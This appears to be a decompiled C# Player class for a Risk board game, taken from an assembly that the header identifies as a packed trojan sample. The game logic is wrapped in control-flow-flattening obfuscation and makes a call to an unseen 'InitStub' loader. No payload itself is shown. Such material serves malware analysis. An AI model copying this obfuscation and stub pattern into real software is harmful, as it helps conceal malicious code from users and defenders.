// Decompiled with JetBrains decompiler
// Type: RiskGame.Player
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Structs;
using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Media;

namespace RiskGame
{
  [Serializable]
  public abstract class Player : INotifyPropertyChanged
  {
    public int _Setter;
    private int _State;
    private int m_Interceptor;
    public int definition;
    private byte m_Algo;
    private byte _Advisor;
    private byte proccesor;
    [NonSerialized]
    private SolidColorBrush parameter;
    [NonSerialized]
    private Label _Mapping;
    [NonSerialized]
    private Label m_Rule;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Player(string ident)
    {
      int num1 = 5;
      if (Player.ExcludeObject())
        goto label_5;
label_1:
      ListenerManager.InitStub();
      int num2 = 4;
label_4:
      num1 = num2;
label_5:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
          case 4:
            goto label_2;
          case 2:
          case 3:
            goto label_3;
          case 5:
            goto label_1;
          case 6:
            goto label_10;
          default:
            num1 = 0;
            continue;
        }
      }
label_2:
      this.definition = 0;
      num2 = 3;
      goto label_4;
label_3:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      goto label_7;
label_10:
      return;
label_7:
      this.CloneField(ident ?? throw new ArgumentNullException("username"));
      this.m_Interceptor = 0;
      this.Territoriesowned = 0;
      num2 = 6;
      goto label_4;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string WriteField() => this.tokenizer;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CloneField(string i) => this.tokenizer = i;

    public int Territoriesowned
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._State;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num = 4;
        if (Player.CalcObject())
          ;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              this.InterruptField(nameof (Territoriesowned));
              if (true)
              {
                num = 5;
                continue;
              }
              goto label_8;
            case 1:
            case 3:
              if (flag)
              {
                this._State = value;
                goto case 0;
              }
              else
                goto label_1;
            case 4:
              flag = this._State != value;
              num = 3;
              continue;
            case 5:
              goto label_8;
            default:
              num = 0;
              continue;
          }
        }
label_1:
        return;
label_8:;
      }
    }

    public int Army_strength
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Interceptor;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num = 3;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 3:
              flag = this.m_Interceptor != value;
              if (true)
              {
                num = 4;
                continue;
              }
              goto case 2;
            case 1:
            case 4:
              if (flag)
              {
                this.m_Interceptor = value;
                goto case 2;
              }
              else
                goto label_9;
            case 2:
              this.InterruptField(nameof (Army_strength));
              num = 5;
              continue;
            case 5:
              goto label_7;
            default:
              if (true)
              {
                num = 2;
                continue;
              }
              goto label_7;
          }
        }
label_9:
        return;
label_7:;
      }
    }

    public SolidColorBrush Color
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.parameter;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                this.parameter = value;
                if (true)
                {
                  num2 = 5;
                  continue;
                }
                goto label_9;
              case 1:
              case 5:
                goto label_7;
              case 2:
                goto label_13;
              case 4:
                goto label_2;
              case 6:
                goto label_1;
              case 7:
                goto label_11;
              default:
                num2 = 2;
                continue;
            }
          }
label_1:
          this.proccesor = this.parameter.Color.B;
          num1 = 7;
          continue;
label_2:
          bool flag;
          if (!flag)
          {
            this.m_Algo = this.parameter.Color.R;
            this._Advisor = this.parameter.Color.G;
            num1 = 6;
            continue;
          }
          break;
label_7:
          flag = this.parameter == null;
          num1 = 4;
        }
        this.m_Algo = (byte) 0;
        this._Advisor = (byte) 0;
        this.proccesor = (byte) 0;
        return;
label_13:
        return;
label_9:
        return;
label_11:;
      }
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public Label TestField() => this._Mapping;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ComputeField(Label param)
    {
      this._Mapping = param;
      this.EnableField(ref this._Mapping, "Army_strength");
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public Label PostField() => this.m_Rule;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RemoveField(Label reference)
    {
      this.m_Rule = reference;
      this.EnableField(ref this.m_Rule, "Territoriesowned");
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PatchField() => this.Color = new SolidColorBrush(System.Windows.Media.Color.FromRgb(this.m_Algo, this._Advisor, this.proccesor));

    public event PropertyChangedEventHandler PropertyChanged
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 4;
        while (true)
        {
          int num2 = num1;
          PropertyChangedEventHandler changedEventHandler1;
          PropertyChangedEventHandler comparand;
          PropertyChangedEventHandler changedEventHandler2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 4:
                changedEventHandler1 = this.PropertyChanged;
                int num3 = 5;
                num2 = Player.CalcObject() ? num3 : num3;
                continue;
              case 1:
              case 5:
                goto label_1;
              case 2:
                changedEventHandler1 = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.PropertyChanged, changedEventHandler2, comparand);
                if (changedEventHandler1 == comparand)
                {
                  num2 = 6;
                  continue;
                }
                goto label_1;
              case 3:
                changedEventHandler2 = comparand + value;
                goto case 2;
              case 6:
                goto label_5;
              default:
                goto label_9;
            }
          }
label_1:
          comparand = changedEventHandler1;
          num1 = 3;
          continue;
label_9:
          num1 = 2;
        }
label_5:;
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num = 4;
        PropertyChangedEventHandler changedEventHandler1;
        PropertyChangedEventHandler comparand;
        PropertyChangedEventHandler changedEventHandler2;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
              changedEventHandler1 = this.PropertyChanged;
              num = 5;
              continue;
            case 1:
              changedEventHandler1 = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.PropertyChanged, changedEventHandler2, comparand);
              if (changedEventHandler1 == comparand)
              {
                num = 6;
                continue;
              }
              goto case 5;
            case 2:
            case 3:
              changedEventHandler2 = comparand - value;
              goto case 1;
            case 5:
              comparand = changedEventHandler1;
              num = 3;
              continue;
            case 6:
              goto label_8;
            default:
              num = 1;
              continue;
          }
        }
label_8:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InterruptField(string first)
    {
      int num1 = 3;
      while (true)
      {
        bool flag;
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            this.PropertyChanged((object) this, new PropertyChangedEventArgs(first));
            num1 = 5;
            continue;
          case 1:
          case 4:
            if (!flag)
              goto label_2;
            else
              goto case 0;
          case 3:
            flag = this.PropertyChanged != null;
            num2 = 4;
            break;
          case 5:
            goto label_8;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
      }
label_2:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void EnableField(ref Label item, string second)
    {
      int num = 3;
      Binding binding;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            binding.UpdateSourceTrigger = UpdateSourceTrigger.PropertyChanged;
            binding.Source = (object) this;
            goto case 2;
          case 2:
          case 4:
            item.SetBinding(ContentControl.ContentProperty, (BindingBase) binding);
            num = 5;
            continue;
          case 3:
            binding = new Binding(second);
            num = 0;
            continue;
          case 5:
            goto label_6;
          default:
            num = 4;
            continue;
        }
      }
label_6:;
    }

    internal static bool ExcludeObject() => true;

    internal static bool CalcObject() => false;
  }
}
